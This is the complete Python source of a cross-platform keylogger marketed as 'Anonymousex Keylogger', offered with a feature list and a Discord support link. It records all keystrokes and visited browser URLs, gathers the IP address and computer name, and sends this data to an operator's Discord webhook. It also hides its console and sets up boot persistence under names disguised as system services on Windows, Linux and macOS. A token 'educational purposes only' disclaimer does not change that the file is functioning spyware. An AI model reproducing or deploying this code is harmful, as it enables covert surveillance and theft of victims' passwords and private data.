import keyboard
import requests
import json
import threading
import time
import os
import sys
import socket
import platform
import subprocess
import psutil
import shutil
from datetime import datetime
from urllib.parse import urlparse

class DiscordKeylogger:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.keys_buffer = []
        self.visited_websites = []
        self.running = False
        self.user_ip = self.get_ip()
        self.computer_name = self.get_computer_info()
        self.start_time = datetime.now()
        self.browser_monitor_thread = None
        self.is_auto_start = False
        
    def get_ip(self):
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            try:
                return socket.gethostbyname(socket.gethostname())
            except:
                return "Unknown"
    
    def get_computer_info(self):
        try:
            return f"{platform.node()} ({platform.system()} {platform.release()})"
        except:
            return "Unknown"
    
    def get_active_browser_url(self):
        try:
            if sys.platform == "win32":
                try:
                    output = subprocess.check_output(
                        'powershell "(New-Object -ComObject Shell.Application).Windows() | ForEach-Object { $_.LocationURL }"',
                        shell=True, timeout=2
                    ).decode('utf-8').strip()
                    
                    urls = [url for url in output.split('\n') if url and url.startswith('http')]
                    if urls:
                        return urls[0]
                except:
                    pass
                    
            elif sys.platform == "darwin":
                try:
                    script = 'tell application "Google Chrome" to get URL of active tab of front window'
                    url = subprocess.check_output(['osascript', '-e', script]).decode('utf-8').strip()
                    if url:
                        return url
                except:
                    try:
                        script = 'tell application "Safari" to get URL of front document'
                        url = subprocess.check_output(['osascript', '-e', script]).decode('utf-8').strip()
                        if url:
                            return url
                    except:
                        pass
            
            elif sys.platform.startswith('linux'):
                try:
                    active_window = subprocess.check_output(['xdotool', 'getactivewindow']).decode('utf-8').strip()
                    window_class = subprocess.check_output(['xdotool', 'getwindowclassname', active_window]).decode('utf-8').strip()
                    
                    if 'chrome' in window_class.lower() or 'firefox' in window_class.lower() or 'browser' in window_class.lower():
                        subprocess.call(['xdotool', 'key', '--window', active_window, 'ctrl+l'])
                        time.sleep(0.1)
                        subprocess.call(['xdotool', 'key', '--window', active_window, 'ctrl+c'])
                        time.sleep(0.1)
                        
                        try:
                            url = subprocess.check_output(['xclip', '-o', '-selection', 'clipboard']).decode('utf-8').strip()
                            if url.startswith('http'):
                                return url
                        except:
                            try:
                                url = subprocess.check_output(['xsel', '-b']).decode('utf-8').strip()
                                if url.startswith('http'):
                                    return url
                            except:
                                pass
                except:
                    pass
                    
        except Exception as e:
            pass
            
        return None
    
    def monitor_browsers(self):
        last_url = None
        check_interval = 5
        
        while self.running:
            try:
                current_url = self.get_active_browser_url()
                if current_url and current_url != last_url:
                    parsed_url = urlparse(current_url)
                    domain = parsed_url.netloc
                    
                    if domain and (not self.visited_websites or domain != self.visited_websites[-1].get('domain')):
                        website_info = {
                            'domain': domain,
                            'full_url': current_url,
                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        }
                        self.visited_websites.append(website_info)
                        
                        if len(self.visited_websites) > 10:
                            self.visited_websites = self.visited_websites[-10:]
                        
                        last_url = current_url
                        
            except Exception as e:
                pass
                
            time.sleep(check_interval)
    
    def on_key_press(self, event):
        key = event.name
        if len(key) > 1:
            key = f"[{key.upper()}]"
        self.keys_buffer.append(key)
        
        if len(self.keys_buffer) >= 50:
            self.send_to_discord()
    
    def create_embed(self, keys_data):
        keys_text = ''.join(keys_data)
        if len(keys_text) > 1000:
            keys_text = keys_text[:1000] + "..."
        
        runtime = datetime.now() - self.start_time
        hours, remainder = divmod(runtime.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        runtime_str = f"{int(hours)}h {int(minutes)}m {int(seconds)}s"
        
        visited_sites_field = None
        if self.visited_websites:
            sites_text = "\n".join([f"{site['timestamp']} - {site['domain']}" 
                                   for site in self.visited_websites[-5:]])
            visited_sites_field = {
                "name": "🌐 Recently Visited Websites",
                "value": f"```\n{sites_text}\n```",
                "inline": False
            }
        
        embed = {
            "title": "🔑 Keylogger Active",
            "color": 0x9932CC, 
            "fields": [
                {
                    "name": "Keystrokes",
                    "value": f"```\n{keys_text}\n```",
                    "inline": False
                },
                {
                    "name": "Total Keys",
                    "value": str(len(keys_data)),
                    "inline": True
                },
                {
                    "name": "User IP",
                    "value": self.user_ip,
                    "inline": True
                },
                {
                    "name": "Computer",
                    "value": self.computer_name,
                    "inline": True
                },
                {
                    "name": "Runtime",
                    "value": runtime_str,
                    "inline": True
                },
                {
                    "name": "Time",
                    "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "inline": True
                }
            ],
            "footer": {
                "text": "Anonymousex Keylogger | discord.gg/deza"
            },
            "timestamp": datetime.utcnow().isoformat()
        }
        
        if visited_sites_field:
            embed["fields"].insert(1, visited_sites_field)
        
        return embed
    
    def send_to_discord(self):
        if not self.keys_buffer:
            return
        
        keys_to_send = self.keys_buffer.copy()
        self.keys_buffer = []
        
        embed = self.create_embed(keys_to_send)
        
        payload = {
            "embeds": [embed],
            "username": "Anonymousex Keylogger",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/2881/2881142.png"
        }
        
        try:
            requests.post(
                self.webhook_url,
                data=json.dumps(payload),
                headers={"Content-Type": "application/json"},
                timeout=10
            )
        except:
            self.keys_buffer = keys_to_send + self.keys_buffer
    
    def send_loop(self):
        while self.running:
            time.sleep(30)
            if self.keys_buffer:
                self.send_to_discord()
    
    def hide_console(self):
        if os.name == 'nt':
            try:
                import win32console
                import win32gui
                window = win32console.GetConsoleWindow()
                win32gui.ShowWindow(window, 0)
            except:
                pass
    
    def install_auto_start(self):
        try:
            if platform.system() == "Windows":
                appdata_path = os.getenv('APPDATA')
                if not appdata_path:
                    return False
                    
                target_dir = os.path.join(appdata_path, "Microsoft", "WindowsKeylogger")
                if not os.path.exists(target_dir):
                    os.makedirs(target_dir)
                
                current_exe = sys.executable
                target_exe = os.path.join(target_dir, "windows_system_service.exe")
                
                if not current_exe.lower() == target_exe.lower():
                    shutil.copyfile(current_exe, target_exe)
                
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                try:
                    reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(reg_key, "WindowsSystemService", 0, winreg.REG_SZ, target_exe)
                    winreg.CloseKey(reg_key)
                    return True
                except Exception as e:
                    try:
                        startup_path = os.path.join(appdata_path, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                        bat_path = os.path.join(startup_path, "system_service.bat")
                        
                        with open(bat_path, 'w') as bat_file:
                            bat_file.write(f'@echo off\nstart "" "{target_exe}" --auto-start\n')
                        
                        return True
                    except:
                        return False
            
            elif platform.system() == "Linux":
                autostart_dir = os.path.expanduser("~/.config/autostart")
                if not os.path.exists(autostart_dir):
                    os.makedirs(autostart_dir)
                
                desktop_file = os.path.join(autostart_dir, "system-monitor.desktop")
                
                with open(desktop_file, 'w') as f:
                    f.write(f"""[Desktop Entry]
Type=Application
Name=System Monitor
Exec={sys.executable} --auto-start
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
                return True
                
            elif platform.system() == "Darwin":
                launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
                if not os.path.exists(launch_agents_dir):
                    os.makedirs(launch_agents_dir)
                
                plist_file = os.path.join(launch_agents_dir, "com.apple.systemmonitor.plist")
                
                with open(plist_file, 'w') as f:
                    f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemmonitor</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>--auto-start</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>
""")
                subprocess.call(['launchctl', 'load', plist_file])
                return True
                
        except Exception as e:
            return False
        
        return False
    
    def remove_auto_start(self):
        try:
            if platform.system() == "Windows":
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                try:
                    reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
                    winreg.DeleteValue(reg_key, "WindowsSystemService")
                    winreg.CloseKey(reg_key)
                except:
                    pass
                
                appdata_path = os.getenv('APPDATA')
                if appdata_path:
                    startup_path = os.path.join(appdata_path, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                    bat_path = os.path.join(startup_path, "system_service.bat")
                    if os.path.exists(bat_path):
                        os.remove(bat_path)
                
                target_dir = os.path.join(appdata_path, "Microsoft", "WindowsKeylogger")
                target_exe = os.path.join(target_dir, "windows_system_service.exe")
                if os.path.exists(target_exe):
                    os.remove(target_exe)
                
            elif platform.system() == "Linux":
                autostart_dir = os.path.expanduser("~/.config/autostart")
                desktop_file = os.path.join(autostart_dir, "system-monitor.desktop")
                if os.path.exists(desktop_file):
                    os.remove(desktop_file)
                
            elif platform.system() == "Darwin":
                launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
                plist_file = os.path.join(launch_agents_dir, "com.apple.systemmonitor.plist")
                if os.path.exists(plist_file):
                    subprocess.call(['launchctl', 'unload', plist_file])
                    os.remove(plist_file)
                    
        except Exception as e:
            return False
        
        return True
    
    def start(self):
        self.hide_console()
        self.running = True
        
        self.browser_monitor_thread = threading.Thread(target=self.monitor_browsers, daemon=True)
        self.browser_monitor_thread.start()
        
        startup_embed = {
            "title": "🚀 Anonymousex Keylogger Started",
            "color": 0x00FF7F,  
            "fields": [
                {
                    "name": "Computer",
                    "value": self.computer_name,
                    "inline": True
                },
                {
                    "name": "IP Address",
                    "value": self.user_ip,
                    "inline": True
                },
                {
                    "name": "Start Time",
                    "value": self.start_time.strftime("%Y-%m-%d %H:%M:%S"),
                    "inline": True
                },
                {
                    "name": "Start Mode",
                    "value": "Auto-Start" if self.is_auto_start else "Manual Start",
                    "inline": True
                }
            ],
            "footer": {
                "text": "Anonymousex Keylogger | discord.gg/deza"
            }
        }
        
        startup_payload = {
            "embeds": [startup_embed],
            "username": "Anonymousex Keylogger"
        }
        
        try:
            requests.post(
                self.webhook_url,
                data=json.dumps(startup_payload),
                headers={"Content-Type": "application/json"},
                timeout=10
            )
        except:
            pass
        
        keyboard.on_press(self.on_key_press)
        send_thread = threading.Thread(target=self.send_loop, daemon=True)
        send_thread.start()
        
        try:
            keyboard.wait()
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        self.running = False
        if self.keys_buffer:
            self.send_to_discord()
        
        shutdown_embed = {
            "title": "🛑 Anonymousex Keylogger Stopped",
            "color": 0xFF4500,  
            "fields": [
                {
                    "name": "Total Runtime",
                    "value": str(datetime.now() - self.start_time),
                    "inline": True
                },
                {
                    "name": "Total Keys Captured",
                    "value": str(len(self.keys_buffer)),
                    "inline": True
                }
            ],
            "footer": {
                "text": "Anonymousex Keylogger | discord.gg/deza"
            }
        }
        
        shutdown_payload = {
            "embeds": [shutdown_embed],
            "username": "Anonymousex Keylogger"
        }
        
        try:
            requests.post(
                self.webhook_url,
                data=json.dumps(shutdown_payload),
                headers={"Content-Type": "application/json"},
                timeout=10
            )
        except:
            pass
        
        keyboard.unhook_all()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def animate_text(text, delay=0.01):  
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

def print_ascii_art():
    ascii_art = [
        " █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗███╗   ███╗ ██████╗ ███████╗██╗  ██╗",
        "██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚██╗ ██╔╝████╗ ████║██╔═══██╗██╔════╝╚██╗██╔╝",
        "███████║██╔██╗ ██║██║   ██║██╔██╗ ██║ ╚████╔╝ ██╔████╔██║██║   ██║█████╗   ╚███╔╝ ",
        "██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██╔══╝   ██╔██╗ ",
        "██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║╚██████╔╝███████╗██╔╝ ██╗",
        "╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝"
    ]
    
    colors = ["\033[95m", "\033[96m", "\033[94m", "\033[92m", "\033[93m", "\033[91m"]  
    
    for i, line in enumerate(ascii_art):
        print(f"{colors[i % len(colors)]}{line}\033[0m")
        time.sleep(0.05)  

def show_welcome():
    clear_screen()

    print_ascii_art()
    
    print()
    animate_text("\033[1;95m" + "╔══════════════════════════════════════════════════════════════════════╗" + "\033[0m")
    animate_text("\033[1;95m" + "║                 A N O N Y M O U S E X  K E Y L O G G E R             ║" + "\033[0m")
    animate_text("\033[1;95m" + "╚══════════════════════════════════════════════════════════════════════╝" + "\033[0m")
    print()
    
    animate_text("\033[1;96m" + "🌟 Premium Features:" + "\033[0m")
    animate_text("   • Real-time keystroke capture")
    animate_text("   • Browser activity monitoring")
    animate_text("   • Auto-start on system boot")
    animate_text("   • Discord webhook integration")
    animate_text("   • System intelligence gathering")
    animate_text("   • Stealth background operation")
    animate_text("   • Automated data transmission")
    print()
    animate_text("\033[1;94m" + "🔗 Join our Discord for support: discord.gg/deza" + "\033[0m")
    print()
    animate_text("\033[1;91m" + "⚠️  Legal Disclaimer: For educational purposes only!" + "\033[0m")
    animate_text("   Use only on systems you own or have explicit permission.")
    print()
    print("\033[1;92m" + "=" * 70 + "\033[0m")

def get_webhook_url():
    print("\n\033[1;94m" + "📝 Webhook Configuration" + "\033[0m")
    print("🔗 Get webhook from: Discord Server → Settings → Webhooks")
    print()
    
    while True:
        webhook_url = input("\033[1;96m" + "🌐 Enter Discord Webhook URL: " + "\033[0m").strip()
        
        if not webhook_url:
            print("\033[1;91m" + "❌ URL cannot be empty. Please try again.\n" + "\033[0m")
            continue
            
        if not webhook_url.startswith('https://discord.com/api/webhooks/'):
            print("\033[1;91m" + "❌ Invalid Discord webhook URL format." + "\033[0m")
            print("   Format should be: https://discord.com/api/webhooks/...")
            print("   Please check and try again.\n")
            continue
            
        print("🔍 Testing webhook connection...")
        try:
            test_payload = {
                "content": "✅ Anonymousex Keylogger connection test successful!",
                "username": "Anonymousex Keylogger",
                "embeds": [{
                    "title": "🔗 Connection Test",
                    "description": "Anonymousex Keylogger is ready to start!",
                    "color": 0x00FF7F,  
                    "footer": {
                        "text": "Anonymousex Keylogger | discord.gg/deza"
                    }
                }]
            }
            response = requests.post(
                webhook_url,
                data=json.dumps(test_payload),
                headers={"Content-Type": "application/json"},
                timeout=10
            )
            
            if response.status_code in [200, 204]:
                print("\033[1;92m" + "✅ Webhook test successful! Connection established." + "\033[0m")
                return webhook_url
            else:
                print(f"\033[1;91m" + f"❌ Webhook test failed (Status: {response.status_code})" + "\033[0m")
                print("   Please check your webhook URL and permissions.\n")
                
        except requests.exceptions.RequestException as e:
            print(f"\033[1;91m" + f"❌ Connection error: {e}" + "\033[0m")
            print("   Check your internet connection and webhook URL.\n")
        
        retry = input("\033[1;93m" + "🔄 Press Enter to try again or type 'exit' to quit: " + "\033[0m").strip().lower()
        if retry == 'exit':
            print("👋 Exiting...")
            sys.exit(0)

def show_starting_animation():
    print("\n\033[1;95m" + "🎯 Starting Anonymousex Keylogger..." + "\033[0m")
    
    animations = [
        "🛠️  Loading modules",
        "🔧 Initializing hooks",
        "📡 Establishing connection",
        "🌐 Setting up browser monitoring",
        "🚀 Launching keylogger"
    ]
    
    for i, text in enumerate(animations):
        for j in range(3):
            dots = "." * (j + 1)
            print(f"\r{text}{dots}   ", end='', flush=True)
            time.sleep(0.2) 
    
    print("\r\033[1;92m" + "✅ Initialization complete! Ready to monitor." + "\033[0m" + " " * 20)
    time.sleep(1.0)  

def setup_auto_start(keylogger):
    print("\n\033[1;94m" + "⚙️  Auto-Start Configuration" + "\033[0m")
    print("   This will configure the keylogger to start automatically on system boot.")
    
    response = input("\033[1;96m" + "   Enable auto-start? (y/N): " + "\033[0m").strip().lower()
    
    if response == 'y' or response == 'yes':
        print("   Installing auto-start...")
        if keylogger.install_auto_start():
            print("\033[1;92m" + "   ✅ Auto-start configured successfully!" + "\033[0m")
            print("   The keylogger will now start automatically when your system boots.")
            return True
        else:
            print("\033[1;91m" + "   ❌ Failed to configure auto-start." + "\033[0m")
            print("   This feature may not be supported on your system.")
            return False
    else:
        print("   Skipping auto-start configuration.")
        return False

def main():
    is_auto_start = '--auto-start' in sys.argv
    
    if not is_auto_start:
        show_welcome()
    
    webhook_url = None
    
    if is_auto_start:
        config_path = os.path.join(os.path.dirname(sys.executable), "keylogger_config.json")
        if not os.path.exists(config_path):
            config_path = os.path.join(os.path.expanduser("~"), ".anonymousex_keylogger.json")
        
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    config = json.load(f)
                    webhook_url = config.get('webhook_url')
            except:
                pass
    
    if not webhook_url:
        webhook_url = get_webhook_url()
        
        config_path = os.path.join(os.path.dirname(sys.executable), "keylogger_config.json")
        try:
            with open(config_path, 'w') as f:
                json.dump({'webhook_url': webhook_url}, f)
        except:
            try:
                config_path = os.path.join(os.path.expanduser("~"), ".anonymousex_keylogger.json")
                with open(config_path, 'w') as f:
                    json.dump({'webhook_url': webhook_url}, f)
            except:
                pass
    
    if not is_auto_start:
        show_starting_animation()
    
    keylogger = DiscordKeylogger(webhook_url=webhook_url)
    keylogger.is_auto_start = is_auto_start
    
    if not is_auto_start:
        setup_auto_start(keylogger)
        
        print("\n" + "\033[1;96m" + "=" * 70 + "\033[0m")
        print("\033[1;92m" + "🌙 Anonymousex Keylogger is now running in background!" + "\033[0m")
        print("   • Press Ctrl+C in this window to stop")
        print("   • Console will minimize automatically")
        print("   • Keystrokes and browser activity will be sent to your Discord")
        print("   • Keylogger will auto-start on system reboot")
        print()
        print("\033[1;95m" + "💬 Join our Discord for support: discord.gg/deza" + "\033[0m")
        print("\033[1;96m" + "=" * 70 + "\033[0m")
        
        time.sleep(2)
    
    try:
        keylogger.start()
    except Exception as e:
        if not is_auto_start:
            print(f"\033[1;91m" + f"❌ Error starting keylogger: {e}" + "\033[0m")
            print("   Please check your dependencies and try again.")
    except KeyboardInterrupt:
        if not is_auto_start:
            print("\n\033[1;93m" + "🛑 Stopping keylogger..." + "\033[0m")
        keylogger.stop()

if __name__ == "__main__":
    main()
